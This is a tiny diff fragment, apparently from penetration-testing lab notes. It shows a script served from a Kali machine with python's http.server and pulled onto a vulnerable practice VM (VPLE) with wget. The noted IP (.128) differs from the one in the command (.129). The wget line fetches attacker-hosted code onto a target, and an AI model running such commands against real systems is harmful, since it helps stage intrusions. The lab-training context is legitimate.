@@ -25,5 +25,5 @@ python -m http.server 8081 (server2.py ) we will use this script
 
 ////downloding  server2.py from kali server (192.168.174.128)
 
-wget 192.168.174.129:8081/server2.py
+wget 192.168.174.129:8081/server2.py(IN VPLE)
 
